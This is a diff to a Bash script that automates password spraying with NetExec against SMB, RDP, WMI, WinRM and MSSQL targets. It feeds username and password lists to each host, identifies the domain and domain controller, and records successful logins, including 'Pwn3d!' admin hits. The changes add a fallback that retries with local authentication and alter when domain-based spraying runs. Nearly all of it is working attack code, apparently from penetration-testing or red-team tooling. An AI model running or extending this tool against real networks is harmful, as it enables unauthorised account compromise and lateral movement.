@@ -53,7 +53,7 @@ if [[ -s "$DC_INFO" ]]; then
         dc_domain="${dc_domain//[[:space:]]/}"
         dc_fqdn="${dc_fqdn//[[:space:]]/}"
         DC_MAP["$dc_domain"]="$dc_ip"
-        DC_FQDN_MAP["$dc_domain"]="${fqdn:-DC01.$dc_domain}"
+        DC_FQDN_MAP["$dc_domain"]="${dc_fqdn:-DC01.$dc_domain}"
     done < "$DC_INFO"
 fi
 
@@ -82,7 +82,7 @@ get_domain() {
     done
 
     local domain="" hostname="" nxc_out
-    echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress${NC}"
+    echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress${NC}" >&2
     nxc_out=$(timeout 15s nxc smb "$ip" --no-progress 2>/dev/null)
     domain=$(echo "$nxc_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
     hostname=$(echo "$nxc_out" | grep -oP '(?<=\(name:)[^)]+' | head -n1)
@@ -106,8 +106,9 @@ process_target_proto() {
     local ip="$1"
     local proto="$2"
     local DOMAIN
-    DOMAIN=$(get_domain "$ip")
-
+    local SKIP_DOMAIN=""    
+    DOMAIN=$(get_domain "$ip" 2>/dev/null | tail -n1)
+    
     # File temporary unik per thread/job
     local TMP_RES=".tmp_res_${ip}_${proto}_$$"
     local TMP_SUCCESS=".tmp_success_${ip}_${proto}_$$"
@@ -120,11 +121,16 @@ process_target_proto() {
     # -----------------------------------------------------------------
     local DOMAIN_ARG=""
     local EXTRA=""
-    [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] && EXTRA="--local-auth"
 
     local attempt_spray=1
     local max_spray=2
     
+
+    if [[ "$DOMAIN" == "." ]]; then
+        SKIP_DOMAIN=1
+    fi
+
+
     while [ $attempt_spray -le $max_spray ]; do
         echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" $EXTRA --continue-on-success --no-progress${NC}"
         timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" $EXTRA --continue-on-success --no-progress > "$TMP_RES" 2>&1
@@ -146,9 +152,16 @@ process_target_proto() {
         fi
     done
 
-    if [[ ! -s "$TMP_SUCCESS" && "$DOMAIN" != "." && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
+    # --- FALLBACK LOCAL AUTH ---
+    if [[ ! -s "$TMP_SUCCESS" ]]; then
+        echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" --local-auth --continue-on-success --no-progress${NC}"
+        timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" --local-auth --continue-on-success --no-progress > "$TMP_RES" 2>&1
+        sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
+        cat "$TMP_RES" >> "$RAW_OUT"
+        grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
+    fi
+    if [[ ! -s "$TMP_SUCCESS" && -z "$SKIP_DOMAIN" && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
         local attempt_dom=1
-        EXTRA="" 
         while [ $attempt_dom -le $max_spray ]; do
             echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" -d \"$DOMAIN\" --continue-on-success --no-progress${NC}"
             timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress > "$TMP_RES" 2>&1
